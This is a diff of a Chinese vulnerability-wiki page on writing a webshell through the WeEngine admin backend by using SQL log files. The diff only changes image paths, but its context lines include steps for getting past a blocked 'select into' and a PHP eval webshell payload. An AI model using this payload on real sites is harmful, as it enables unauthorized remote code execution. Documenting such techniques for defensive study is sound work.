@@ -12,13 +12,13 @@
 
 ### 1.站点设置里面打开调试
 
-![](/Users/aresx/Documents/VulWiki/.resource/微擎后台绕过禁用函数写shell/media/rId25.png)
+![](./.resource/微擎后台绕过禁用函数写shell/media/rId25.png)
 
 ### 2.执行语句
 
 select into被禁止
 
-![](/Users/aresx/Documents/VulWiki/.resource/微擎后台绕过禁用函数写shell/media/rId27.png)
+![](./.resource/微擎后台绕过禁用函数写shell/media/rId27.png)
 
 ### 3.利用日志文件写shell
 
@@ -30,7 +30,7 @@ select into被禁止
 
     select '<?php eval($_POST[cmd]);?>'  #写入shell
 
-![](/Users/aresx/Documents/VulWiki/.resource/微擎后台绕过禁用函数写shell/media/rId29.png)
+![](./.resource/微擎后台绕过禁用函数写shell/media/rId29.png)
 
 ### 4.SQL查询免杀shell的语句
 
